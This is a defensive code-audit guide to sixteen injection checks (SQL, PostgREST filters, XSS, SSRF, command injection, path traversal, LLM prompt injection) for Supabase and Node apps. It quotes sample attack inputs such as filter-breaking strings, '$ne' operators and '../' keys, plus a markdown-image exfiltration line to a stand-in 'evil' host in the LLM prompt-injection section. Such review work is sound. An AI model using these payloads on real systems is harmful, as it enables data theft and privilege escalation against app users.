# Injection checks (area `injection`)

Untrusted data, such as user text, deep-link params, third-party responses or LLM output, can reach an interpreter: PostgREST filter grammar, SQL, plpgsql `EXECUTE`, SQLite, HTML/JS, a shell, a URL fetcher, a file path, a regex engine or an LLM with tools.
Findings use category `backend` when the sink runs on the server or in Postgres. They use `client-security` when it runs on the device or in the web build. Finding ids are numbered per report (`INJ-001`); the check IDs below (`INJ-01`) are stable references.
**Direct-db rule of thumb:** an attacker with the decompiled app can call PostgREST directly with their own JWT. An "injection" in client-side query building is therefore a robustness bug (P2) unless it crosses a trust boundary: server code, a privileged client, or a filter that acts as authorization.

| ID | Check | Typical severity |
|---|---|---|
| INJ-01 | PostgREST filter-string injection (`.or` / `.filter` / `.not`) | P1 server, P2 client |
| INJ-02 | LIKE / ILIKE / regex / full-text pattern injection | P2 |
| INJ-03 | Raw SQL in Node backends | P0–P1 |
| INJ-04 | Dynamic SQL inside plpgsql / RPCs | P0–P1 |
| INJ-05 | On-device SQLite (expo-sqlite) | P2 |
| INJ-06 | NoSQL / Firestore operator injection and rules | P1 |
| INJ-07 | WebView HTML / JS injection | P1 |
| INJ-08 | Web XSS (`dangerouslySetInnerHTML`, `innerHTML`, markdown, `eval`) | P1–P2 |
| INJ-09 | Server-rendered HTML and email templates | P1–P2 |
| INJ-10 | Command injection | P0–P1 |
| INJ-11 | SSRF (server fetches of user URLs) | P0–P1 |
| INJ-12 | Path traversal in file paths and storage keys | P1 |
| INJ-13 | ReDoS / regex built from input | P2 |
| INJ-14 | LLM prompt injection (tools, secrets, rendered output) | P1 |
| INJ-15 | Header / CRLF / log injection | P2 |
| INJ-16 | Prototype pollution and unsafe merges | P1–P2 |

---

### INJ-01 · PostgREST filter-string injection
supabase-js passes `.or()`, `.filter()` and `.not()` strings to PostgREST **as-is**. Commas, dots, colons and parentheses are grammar. Take `.or(\`name.eq.${q},email.eq.${q}\`)` with `q = "x,role.eq.admin"`: the logic tree becomes `name.eq.x OR role.eq.admin OR …`. With `q = "x),and(owner_id.neq.<uuid>"` an attacker can close the group and add new branches. An injected filter can remove the restriction a developer intended, but it **cannot** escape RLS.
**Severity guide:** P0 when the string is built in a server route that uses the service-role/secret key and the filter is the only scoping (`.or(\`owner_id.eq.${uid},title.ilike.${q}\`)`). · P1 when it is server-side with a user-scoped client but the filter enforces business rules (status, visibility, tenant), or when RLS on the table is weak (see ACL-07). · P2 on the client, where RLS is the boundary: the bug is a broken search on `,` or `)`.
**Signals:** `postgrest-filter-interpolation`, `inputSurfaces[].sinks` (supabase table calls), `api.serviceRoleRoutes`.
**How to verify:**
1. Open each hit. Find the variable interpolated into the filter string.
2. Trace the variable back: route param / query / body / TextInput / deep link → this call. Read the shared query helper first if there is one (`lib/db`, `search.ts`).
3. Identify the client: a service-role/secret client, or a user-scoped client with RLS?
4. Decide whether the filter carries authorization (owner, tenant, `is_public`, `status`). If it does, and the client bypasses RLS, the finding is P0.
**Not a problem when:** the value comes from an allow-list or enum (`z.enum([...])`), a uuid validated with `z.string().uuid()`, or a number. Column filters like `.eq('col', v)`, `.ilike('col', v)` and `.in('col', arr)` are safe: supabase-js encodes `in` values and the other methods put the value after the operator, so a comma cannot start a new condition. The string may also be built only from constants.
**Fix:**
- Prefer separate builder calls: `.eq('status', s).ilike('title', pattern)`. For OR across columns over user input, use an RPC with typed params:
```sql
create function public.search_notes(p_q text) returns setof public.notes
language sql stable security invoker set search_path = '' as $$
  select * from public.notes
  where title ilike '%' || p_q || '%' or body ilike '%' || p_q || '%'   -- p_q is a bound param; escape LIKE wildcards in the caller (INJ-02)
$$;
```
- If you must keep `.or()`, validate first (length, charset). Then quote each value in PostgREST syntax: wrap it in `"…"`, escaping `\` as `\\` and `"` as `\"`.
```ts
const pgrstQuote = (v: string) => `"${v.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"`;
supabase.from('notes').select('id,title').or(`title.ilike.${pgrstQuote(`%${q}%`)},body.ilike.${pgrstQuote(`%${q}%`)}`);
```
- Server routes: never put ownership into an interpolated `.or()`. Scope with `.eq('owner_id', userId)` as a separate call, or use the user-scoped client.

### INJ-02 · LIKE / ILIKE / regex / full-text pattern injection
`%` and `_` (and the escape char `\`) in user input change a pattern match. A search for `%` lists everything, and `_` matches any single character. PostgREST also accepts `*` as a `%` alias in `like`/`ilike` values. The regex operators (`match`, `imatch`, Postgres `~`) accept full regexes, which raises ReDoS and timeout risk (INJ-13). `.textSearch(col, q)` with `type: 'websearch'` is forgiving, but the raw `to_tsquery` syntax throws on malformed input, which leaks 500s.
**Severity guide:** P1 when the pattern match is an authorization or lookup gate on the server (e.g. "find invite by code `ilike`", or an exact-match intent where `%` returns other users' rows through a privileged client). · P2 for over-broad search results, expensive scans, or 500s from malformed `tsquery`.
**Signals:** `postgrest-wildcard-interpolation`, `rls.issues.usingTrue` (an over-broad search matters more on world-readable tables).
**How to verify:** read the hit, then check whether the intent is "contains" or "equals". For "equals", `ilike` is the bug: use `.eq`. For "contains", check whether wildcards are escaped and whether the term length is capped.
**Not a problem when:** RLS limits rows to the caller's own and the only effect is a broader search over their own data. Also fine: wildcards escaped, term length ≤ ~100, and an index (`pg_trgm`) present.
**Fix:**
```ts
const escapeLike = (s: string) => s.replace(/[\\%_]/g, (c) => `\\${c}`).replace(/\*/g, ''); // `*` is a PostgREST wildcard alias
await supabase.from('notes').select('id,title').ilike('title', `%${escapeLike(q.slice(0, 100))}%`);
```
In SQL, `ilike` uses `\` as the default escape character. Escape the same way inside RPCs, or use `position(lower(p_q) in lower(title)) > 0` for a literal contains. For full-text search, use `websearch_to_tsquery` / `{ type: 'websearch' }`.

### INJ-03 · Raw SQL in Node backends
**Severity guide:** P0 when user input reaches a concatenated/interpolated SQL string on a connection that bypasses RLS (direct Postgres, pooler, service role), which is the normal case for server SQL. · P1 when the input is validated to a narrow type but the pattern stays unsafe (one refactor away), or the query runs as a restricted role. · P2 for identifiers from an allow-list built with string concatenation.
**Signals:** `raw-sql-interpolation`, `prisma-raw-unsafe`, `inputSurfaces[].importsFollowed` (the route → db helper chain).
**How to verify:**
1. Identify the driver and read the db helper.
2. For each hit, check whether the SQL text and the values travel separately.
3. Values in identifiers (`order by ${col}`, table names) need an allow-list; parameters cannot bind identifiers.
**Not a problem when:** you see any of these safe forms.
- Tagged templates are parameterized: postgres.js ``sql`select … where id = ${id}` ``, drizzle ``sql`…${v}` ``, Kysely ``sql`…` ``, Prisma ``$queryRaw`…${v}` `` / ``$executeRaw`…` ``, and `Prisma.sql`.
- `pg` `client.query('… where id = $1', [id])` is parameterized.
- knex `knex.raw('… where id = ?', [id])` (with `??` for identifiers) is parameterized.
- The interpolated value is a constant or comes from an allow-list map.
**Unsafe forms:**
- ``client.query(`… ${x}`)``
- `sql.unsafe(str)` (postgres.js)
- `sql.raw(str)` (drizzle/Kysely)
- `Prisma.raw(str)`
- `$queryRawUnsafe(\`… ${x}\`)`. `$queryRawUnsafe('… $1', x)` with positional params is safe but flagged; prefer the tagged form.
- `knex.raw(\`… ${x}\`)`
- `.whereRaw(\`… ${x}\`)`
**Fix:**
```ts
await pool.query('select id, title from notes where owner_id = $1 and id = $2', [userId, id]);   // pg
await sql`select id, title from notes where owner_id = ${userId} and id = ${id}`;               // postgres.js / drizzle
await prisma.$queryRaw`select id from notes where owner_id = ${userId}::uuid`;                 // Prisma
const SORT = { newest: 'created_at desc', title: 'title asc' } as const;                        // identifiers: allow-list
const orderBy = SORT[parsed.sort] ?? SORT.newest;
```

### INJ-04 · Dynamic SQL inside plpgsql / RPCs
`EXECUTE` builds SQL at runtime inside the database. In a `security definer` RPC it runs as the owner and bypasses RLS.
**Severity guide:** P0 when an RPC callable by `anon`/`authenticated` concatenates a parameter into `EXECUTE` (`'… where ' || p_filter`, `format('%s', p)`), especially as `security definer`. · P1 when only an identifier is concatenated without `%I` / `quote_ident`, or the function lacks `set search_path`. · P2 for dynamic SQL limited to internal, non-exposed functions.
**Signals:** `sqlDynamic[]` (plpgsql `EXECUTE` with `||` or `format()` with `%s`), `appMigrations.*` (function definitions).
**How to verify:** open each function and list its params. Check whether each param is used through `USING $n`, as `%I` (identifier) or `%L` (literal), or raw. Then check who can execute it (`grant execute`; default `public` grant) and whether it is `security definer`.
**Not a problem when:** values go through `USING` and identifiers through `format('%I', …)` checked against an allow-list. Static SQL in plpgsql (no `EXECUTE`) is parameterized automatically.
**Fix:**
```sql
create or replace function public.list_rows(p_table text, p_owner uuid)
returns setof jsonb language plpgsql stable security invoker set search_path = '' as $$
begin
  if p_table not in ('notes', 'tasks') then raise exception 'bad table'; end if;
  return query execute format('select to_jsonb(t) from public.%I t where owner_id = $1', p_table) using p_owner;
end $$;
revoke execute on function public.list_rows(text, uuid) from public, anon;
```
Never `'…' || p_x` and never `%s` with params. Definer functions also need `set search_path = ''` and internal `auth.uid()` checks (ACL-10).

### INJ-05 · On-device SQLite (expo-sqlite)
**Severity guide:** P1 when interpolated values come from the network (synced rows, push payloads, deep links, other users' content) and the DB holds data that must stay consistent or other accounts' data. · P2 when the input is the device user's own typing (they own the DB anyway).
**Signals:** `sqlite-interpolation`.
**How to verify:** read the hit and trace the value (TextInput, sync payload, deep link). `execAsync` takes **no params**, so any `${}` inside it is unsafe by construction.
**Not a problem when:** values are bound, or only constants/allow-listed identifiers are interpolated (migrations).
**Fix:**
```ts
await db.runAsync('insert into notes (id, title) values (?, ?)', id, title);
const rows = await db.getAllAsync<Note>('select * from notes where title like ? escape \'\\\'', `%${escapeLike(q)}%`);
await db.getFirstAsync('select * from notes where id = $id', { $id: id });
```
Use a prepared statement (`prepareAsync`) for repeated writes. Drizzle's expo-sqlite driver parameterizes too.

### INJ-06 · NoSQL / Firestore operator injection and rules
**Severity guide:** P1 when a server passes a request object straight into a query (Mongo `find(req.body)` → `{ "$ne": null }`, `$where`, `$regex`), or Firestore Security Rules allow reads/writes beyond the owner (`allow read, write: if request.auth != null;`). · P2 for unbounded queries on the client.
**Signals:** `inputSurfaces[].sinks` (api calls), dependencies `firebase`, `@react-native-firebase/firestore`, `mongodb`, `mongoose`; `firestore.rules` in either repo.
**How to verify:** check whether query objects are built from a validated schema (`z.string()` rejects objects) and read the `firestore.rules` match blocks for each collection the app touches.
**Not a problem when:** inputs are parsed with zod to primitives, or Mongoose `sanitizeFilter: true` is set. The rules may already pin `request.auth.uid == resource.data.ownerId` and validate `request.resource.data.keys().hasOnly([...])`.
**Fix:** parse to primitives, never spread `req.body` into a filter. Write rules per collection with ownership and field allow-lists, and test them with the Firestore emulator.

### INJ-07 · WebView HTML / JS injection
A WebView with a bridge (`onMessage`, `injectedJavaScript`, `window.ReactNativeWebView.postMessage`) turns XSS into native actions.
**Severity guide:** P1 when user, remote or deep-link data is interpolated into `source={{ html }}` or `injectJavaScript(\`…${x}…\`)`. This rises to P0 if the page or bridge can read the session or trigger payments or deletes. · P2 when the content is app-controlled and there is no bridge.
**Signals:** `webview-html-interpolation`, `webview-onmessage-no-origin`, `inner-html`.
**How to verify:** for each WebView, list the dynamic parts of `html` / `injectJavaScript` and what the `onMessage` handler can do. See PLAT-04 for config hardening.
**Not a problem when:** values are escaped for HTML (`escapeHtml`) and passed to JS as JSON (`JSON.stringify(x)`), and the page uses `textContent`, not `innerHTML`.
**Fix:**
```ts
const escapeHtml = (s: string) => s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]!);
webviewRef.current?.injectJavaScript(`window.render(${JSON.stringify(data)}); true;`);
```
Validate every `onMessage` payload with zod. Gate side effects on `event.nativeEvent.url` origin and an explicit allow-list of actions.

### INJ-08 · Web XSS (`dangerouslySetInnerHTML`, `innerHTML`, markdown, `eval`)
Applies to the react-native-web build, an admin/web Next.js app, and `+html.tsx`.
**Severity guide:** P1 when user-generated or remote content reaches `dangerouslySetInnerHTML` / `innerHTML` unsanitized, a markdown renderer with HTML enabled, or `eval`/`new Function` (P0 if the web app stores tokens in `localStorage`, see SEC-11). · P2 for static or trusted content.
**Signals:** `dangerously-set-html`, `inner-html`, `eval-usage`.
**How to verify:** trace the HTML string to its origin. Check the markdown library's options (`html: true`, `rehype-raw`) and link `href` handling (`javascript:` URLs).
**Not a problem when:** content is sanitized with DOMPurify (`isomorphic-dompurify` on the server) right before rendering, or rendered as text. React escapes `{value}` in JSX.
**Fix:** use `DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })`, `react-markdown` without `rehype-raw`, and allow only `https:`/`mailto:` hrefs. Add a CSP on the web origin (HARD-05).

### INJ-09 · Server-rendered HTML and email templates
**Severity guide:** P1 when user-controlled fields (display name, message, org name) are put unescaped into transactional emails or HTML responses, for example `html: \`<p>${name}</p>\``, Handlebars `{{{triple}}}`, or EJS `<%- %>`. This enables phishing links inside trusted emails and stored XSS in web views. · P2 for plain-text emails with links built from user fields.
**Signals:** `hits` in API code for `html:` template literals, `inputSurfaces[].sinks` → email routes.
**Not a problem when:** templates use React Email / JSX (escaped by default), Handlebars `{{double}}`, or EJS `<%= %>`.
**Fix:** use escaping template engines, and never put user input into `href` without validating `https:` plus an allow-listed host.

### INJ-10 · Command injection
**Severity guide:** P0 when request data reaches `exec`, `execSync`, `spawn(..., { shell: true })` or a shell string (ffmpeg, imagemagick, git, pdf tools). · P1 when only the file name or an argument is user-controlled with `execFile`, because of argument injection (`-o/etc/x`, `--output`).
**Signals:** `command-injection`, `api.sharedHelpers` (media/conversion helpers).
**How to verify:** read the full command construction. Supabase Edge Functions normally cannot spawn subprocesses, so this is mostly a Node / Vercel route concern.
**Not a problem when:** `execFile`/`spawn` uses a fixed binary and an args array, user values are validated (uuid, enum), and a `--` separator precedes positional inputs.
**Fix:** `execFile('ffmpeg', ['-i', '--', inputPath, outPath])` with server-generated paths. Better still, use a library or a managed service instead of a shell.

### INJ-11 · SSRF (server fetches of user URLs)
Covers link previews, "import from URL", avatar by URL, webhooks you call, image proxies and PDF renderers.
**Severity guide:** P0 when a user URL is fetched without an allow-list and internal services, cloud metadata or the DB are reachable, or the response is returned to the user. · P1 when blind (response not returned) or partially restricted (scheme check only). · P2 when hosts are allow-listed but redirects or timeouts are unbounded.
**Signals:** `ssrf-request-url`, BE-A17.
**How to verify:** trace `fetch(x)` / `axios(x)` / `got(x)` back to request data. Check the scheme, host allow-list, private-IP blocking, redirect policy, timeout and size cap.
**Not a problem when:** the URL is built from a constant base plus an encoded path segment (`${BASE}/v1/items/${encodeURIComponent(id)}`), or the host is on a fixed allow-list with `redirect: 'manual'`.
**Fix:**
```ts
import { lookup } from 'node:dns/promises';
import ipaddr from 'ipaddr.js';
const ALLOWED_HOSTS = new Set(['images.example-cdn.com']);
export async function safeFetch(raw: string) {
  const u = new URL(raw);
  if (u.protocol !== 'https:' || !ALLOWED_HOSTS.has(u.hostname)) throw new Error('url not allowed');
  for (const { address } of await lookup(u.hostname, { all: true }))
    if (ipaddr.process(address).range() !== 'unicast') throw new Error('private address'); // blocks 127/8, 10/8, 169.254/16, ::1, fc00::/7 …
  return fetch(u, { redirect: 'manual', signal: AbortSignal.timeout(5000) });
}
```
Without an allow-list, the DNS check can be raced (DNS rebinding). For arbitrary URLs, route through an egress proxy that enforces the block list. Cap the response size.

### INJ-12 · Path traversal in file paths and storage keys
**Severity guide:** P1 when user input builds a storage object key (`${userId}/${body.filename}`) or `fs` path on the server. With a service-role client no storage policy applies, so `../<otherUserId>/x` or an absolute key overwrites or reads other users' objects (P0 if confirmed with a privileged client). · P2 on device (`FileSystem.documentDirectory + name`) or when storage policies pin the first folder to `auth.uid()`.
**Signals:** `path-traversal`, `upload-no-validation`, `rls.issues.storagePolicies`.
**How to verify:** find every `storage.from(b).upload/download/createSignedUrl/remove(path)` and `fs.*(path)`. Trace each `path` part to its source, and check which client (user or service) performs the call.
**Not a problem when:** the key is fully server-generated (`${userId}/${crypto.randomUUID()}.${ext}` with `ext` from an allow-list), or the user client is used and storage policies enforce `(storage.foldername(name))[1] = (select auth.uid())::text`.
**Fix:** generate keys server-side and validate any user segment with `/^[A-Za-z0-9._-]{1,100}$/`, rejecting `..`. For `fs`, use `const p = path.resolve(BASE, name); if (!p.startsWith(BASE + path.sep)) throw …`. Do not rely on storage normalizing `..`.

### INJ-13 · ReDoS / regex built from input
**Severity guide:** P2 by default. P1 when it runs on the server on unauthenticated input (one request pins a function instance), or it is a Postgres regex (`~`, PostgREST `match`/`imatch`) on a large table without `statement_timeout`.
**Signals:** `regexp-from-input`; also look for hand-written validation regexes with nested quantifiers (`(a+)+`, `(.*a){n}`) on long inputs.
**Not a problem when:** input is escaped before `new RegExp`, length-capped (≤ 200), or matched with a linear-time engine (`re2`).
**Fix:** `const esc = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');`. Cap lengths in zod and set `statement_timeout` for the `authenticated` role.

### INJ-14 · LLM prompt injection
User text, documents, web pages or emails passed to an LLM can override instructions.
**Severity guide:** P1 when the model has tools that read or write data with a privileged client, can call URLs (SSRF), sees secrets or other users' data in its context, or its output is executed (SQL, filters, code) or rendered as HTML. Markdown image exfiltration (`![x](https://evil/?d=…)`) falls here too. P0 if a tool runs with the service role on behalf of any caller. · P2 for chat-only features without tools or sensitive context.
**Signals:** `inputSurfaces[].sinks` → AI routes; dependencies `ai`, `openai`, `@anthropic-ai/sdk`, `@ai-sdk/*`; `api.serviceRoleRoutes` near tool definitions.
**How to verify:** list tools and the client/permissions each uses. Check what goes into system and user messages and how output is rendered.
**Not a problem when:** tools run with the caller's user-scoped client (RLS applies), take typed, validated arguments, and side-effect tools need user confirmation. Output should be rendered as text, with no remote images.
**Fix:** use least-privilege tools, keep secrets out of prompts, validate tool args with zod, and require a human confirmation for writes. Rate-limit and cap tokens per user (HARD-01).

### INJ-15 · Header / CRLF / log injection
Node (undici) and Deno reject CR/LF in header values, so classic response splitting usually ends in a thrown error (a 500 → HARD-07). The remaining risks:
- `Content-Disposition` with a raw user file name
- `Location` with user input (open redirect, URL-05)
- raw SMTP headers (subject/to)
- newline-forged log lines
**Severity guide:** P2; P1 if forged log lines feed alerting/audit trails.
**Signals:** `hits` on `setHeader`/`headers.set` with request data; logging calls with raw input.
**Fix:** use `filename*=UTF-8''${encodeURIComponent(name)}`, send email through provider JSON APIs, and log structured JSON (`logger.info({ q })`), not string concatenation.

### INJ-16 · Prototype pollution and unsafe merges
**Severity guide:** P1 when request JSON is deep-merged into objects used for config or authorization (`lodash.merge(settings, body)`, custom recursive merge), or into a query/options object. · P2 for client-side merges of remote config.
**Signals:** `mass-assignment` (same spreading pattern), deps `lodash.merge`, `deepmerge`, `merge-deep` and their versions (SUP-02).
**Not a problem when:** the body is parsed with a zod schema first (unknown keys stripped), or the target is `Object.create(null)` or a `Map`.
**Fix:** use `schema.strict().parse(body)` and reject `__proto__`, `constructor` and `prototype` keys. Upgrade vulnerable merge libraries.

---

## Tracing an input to its sinks

`security-scan.mjs` gives `inputSurfaces[]` entries of the form `{file, inputs[], sinks[], importsFollowed[]}`. Use them to build the report's input→sink table without reading every file.

1. Sort surfaces by sink risk: server/API mutations > supabase `rpc` > table writes > table reads > local-only.
2. For each input (TextInput `onChangeText` setter, form field, route/search param, deep-link param), follow the value:
   1. state or form library → hook (`useMutation` / `useQuery` `queryFn`)
   2. → API client method (`lib/api.ts`; `importsFollowed` shows the chain)
   3. → route file in the API repo, matched by path. Read `api.middleware` and `api.sharedHelpers` first.
   4. → validation (zod schema)
   5. → DB call / fetch / shell / HTML.
3. At the sink, record whether the value is bound (parameterized) or concatenated, and where it is validated: client only (doesn't count), route schema, DB constraint.
4. Record one row per input→sink pair. Collapse identical patterns that share a wrapper into one row with a count.

| input | screen/file | sink | parameterized? | validated (where) | verdict |
|---|---|---|---|---|---|
| search box `q` | `app/(tabs)/search.tsx` | `notes.or(title.ilike…)` client | no (`.or` string) | length only (client) | INJ-01 P2 |
| `bio` textarea | `app/profile/edit.tsx` | `POST /api/v1/profile` → `update profiles` | yes (builder) | zod `.max(500)` route | ✅ |
| `filename` | `components/Upload.tsx` | Edge `upload` → `storage.upload(\`${uid}/${name}\`)` service role | n/a | none | INJ-12 P1 |

Client-side validation never counts as a control. Only the server or the database counts.
